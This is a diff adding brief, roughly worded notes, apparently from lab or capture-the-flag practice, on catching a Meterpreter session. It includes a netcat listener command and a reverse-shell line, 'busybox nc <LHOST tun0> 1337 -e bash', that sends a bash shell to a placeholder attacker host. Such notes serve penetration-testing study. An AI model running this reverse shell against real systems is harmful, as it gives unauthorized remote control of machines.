@@ -1,0 +1,7 @@
+Meterpreter
+
+This will allow me to use nc -lnvp to listen the session
+
+the command to finish the execution on meterpreter > shell
+
+ busybox nc <LHOST tun0> 1337 -e bash : this is to finalize the connections listening 
